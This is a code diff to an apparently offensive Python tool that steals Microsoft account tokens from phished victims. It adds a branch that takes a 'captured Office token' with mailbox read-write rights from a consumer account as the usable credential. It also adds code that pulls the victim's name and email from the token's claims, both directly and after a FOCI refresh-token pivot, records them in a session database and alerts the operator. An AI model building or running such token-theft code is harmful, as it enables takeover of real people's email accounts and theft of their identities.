@@ -31,6 +31,16 @@ def _roadtx_expiry():
     return future.strftime('%Y-%m-%d %H:%M:%S')
 
 
+def _decode_jwt_claims(token):
+    """Decode a JWT payload without verification (identity claims only)."""
+    try:
+        payload = token.split('.')[1]
+        payload += '=' * (-len(payload) % 4)
+        return json.loads(base64.urlsafe_b64decode(payload))
+    except Exception:
+        return {}
+
+
 def run_roadtx(args, victim_path, log_stdout=True):
     """Execute a roadtx command within the isolated victim directory.
 
@@ -237,6 +247,27 @@ def _run_post_compromise_chain(user_code):
 
     teams_token_acquired = None
 
+    # ── PERSONAL ACCOUNTS: no post-compromise chain at all ──────
+    # Consumer accounts have no device registration, no PRT and no DRS. The
+    # captured Office token already carries Mail.ReadWrite and is a valid
+    # Microsoft Graph credential, so the chain adds nothing but latency and
+    # failure modes. Resolve the identity from the token claims and finish.
+    if (session.get('account_type') or 'work') == 'personal':
+        logger.info("[PERSONAL] Consumer account — skipping the entire chain; the captured Office token is the credential.")
+        _claims = _decode_jwt_claims(at)
+        _upn = (_claims.get('email')
+                or (_claims.get('unique_name') or '').split('#')[-1]
+                or _claims.get('preferred_username')
+                or _claims.get('upn'))
+        if _upn:
+            _given = _claims.get('given_name') or ''
+            _family = _claims.get('family_name') or ''
+            _name = (_given + ' ' + _family).strip() or _claims.get('name') or _upn.split('@')[0]
+            db.update_session_profile(user_code, _name, _upn, 'User')
+            logger.info(f"[PERSONAL] Identity resolved from token claims: {_name} <{_upn}>")
+        _finalize_and_alert(user_code, at, None)
+        return
+
     # ── STEP 1: FOCI Refresh Token Pivot ────────────────────────
     # Attempt to exchange the captured refresh token for a Teams/Graph token
     # directly via FOCI.  Many consumer app tokens support this; it is a fast
@@ -293,6 +324,15 @@ def _run_post_compromise_chain(user_code):
                     v_role = profile.get('jobTitle') or ''
                     db.update_session_profile(user_code, v_name, v_email, v_role or 'User')
                     logger.info(f"[PERSONAL] Profile resolved via FOCI token: {v_name} <{v_email}>")
+                else:
+                    # Graph throttled or rejected — fall back to the identity
+                    # claims baked into the token itself (no API call needed).
+                    _claims = _decode_jwt_claims(teams_token_acquired)
+                    _upn = (_claims.get('unique_name') or '').split('#')[-1] or _claims.get('preferred_username') or _claims.get('upn')
+                    if _upn:
+                        _name = _claims.get('name') or _upn.split('@')[0]
+                        db.update_session_profile(user_code, _name, _upn, 'User')
+                        logger.info(f"[PERSONAL] Profile resolved from token claims: {_name} <{_upn}>")
             except Exception as e:
                 logger.warning(f"[PERSONAL] Profile lookup via FOCI token failed: {e}")
         _finalize_and_alert(user_code, teams_token_acquired, None)
